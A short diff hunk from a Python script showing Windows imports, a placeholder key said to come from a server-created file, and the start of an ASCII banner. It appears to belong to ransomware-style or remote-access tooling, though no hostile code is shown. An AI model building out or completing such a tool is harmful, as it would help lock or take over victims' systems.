@@ -5,8 +5,9 @@ import os
 import ctypes
 import win32ui
 import getpass
+import threading
 
-key = 'ENTER THE KEY HERE' # the key can be found in the .txt file created by the server
+key = 'ENTER THE KEY HERE (base64)' # the key can be found in the .txt file created by the server
 
 banner = ''' ▄▄▄        ██████  ██░ ██  ██▓ ▄▄▄      
  ▒████▄    ▒██    ▒ ▓██░ ██▒▓██▒▒████▄    
